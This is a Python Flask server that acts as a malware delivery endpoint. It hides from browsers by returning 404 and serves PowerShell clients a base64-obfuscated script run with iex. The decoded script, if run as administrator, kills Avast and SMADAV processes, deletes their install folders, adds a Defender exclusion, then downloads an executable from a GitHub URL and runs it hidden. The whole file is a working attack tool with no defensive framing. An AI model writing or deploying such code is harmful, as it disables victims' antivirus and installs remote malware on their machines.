from flask import Flask, Response, request
import base64
import os

app = Flask(__name__)

@app.route('/')
def direct_command():
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Stealth: 404 for browsers
    if 'mozilla' in user_agent and 'powershell' not in user_agent:
        return Response("Not Found", status=404)

    # This is your full logic (Kill, Cleanup, Download, Run) scrambled into Base64
    # It looks like gibberish to anyone reading the network traffic
    scrambled_logic = "JGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQppZiAoJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkgewogICAgJHByb2NzID0gQCgiQXZhc3RVSSIsICJBdmFzdFN2YyIsICJTbWFkYXYiLCAiU01BREFWIiwgImNsaWVudF8xMCIpCiAgICBmb3JlYWNoICgkcCBpbiAkcHJvY3MpIHsgdGFza2tpbGwgL0YgL0lNICIkcC5leGUiIC9UIDJwPiRudWxsIH0KICAgICRmb2xkZXJzID0gQCgiQzpcXFByb2dyYW0gRmlsZXNcXEF2YXN0IFNvZnR3YXJlIiwgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxTTUFEQVYiLCAiQzpcXFByb2dyYW0gRmlsZXNcXFNNQURBVmFudGl2aXJ1cyIpCiAgICBmb3JlYWNoICgkZiBpbiAkZm9sZGVycykgeyBpZiAoVGVzdC1QYXRoICRmKSB7IFJlbW92ZS1JdGVtIC1QYXRoICRmIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9IH0KICAgICRwYXRoID0gIiRIT01FXFxjbGllbnRfMTAuZXhlIgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgdHJ5IHsKICAgICAgICBpZiAoIShUZXN0LVBhdGggJHBhdGgpKSB7IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoImh0dHBzOi8vZ2l0aHViLmNvbS9qZW1iZXgvVG9wLUZvbGxvd2Vycy9yYXcvcmVmcy9oZWFkcy9tYWluL2NsaWVudF8xMC5leGUiLCAkcGF0aCkgfQogICAgICAgIFN0YXJ0LVByb2Nlc3MgJHBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfSBjYXRjaCB7IH0KfQ=="

    # This command tells PowerShell to decode the Base64 and execute it
    ps_payload = f"$data = [System.Convert]::FromBase64String('{scrambled_logic}'); $code = [System.Text.Encoding]::UTF8.GetString($data); iex $code"

    return Response(ps_payload, mimetype='text/plain')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
    
